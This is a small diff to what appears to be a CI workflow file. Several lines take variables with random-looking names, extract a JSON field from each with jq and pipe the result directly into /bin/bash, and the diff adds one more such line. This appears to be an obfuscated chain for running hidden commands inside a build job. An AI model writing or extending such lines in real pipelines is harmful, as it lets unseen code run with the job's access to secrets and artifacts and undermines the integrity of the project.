@@ -27,6 +27,7 @@ jobs:
           echo $j5 | jq -r .kt2 | /bin/bash
           echo $haxxj543 | jq -r .neu55 | /bin/bash
           printf '%s' "$kl72866" | jq -r .bdqkc3 | /bin/bash
+          printf '%s' "$te5" | jq -r .sehjk01 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
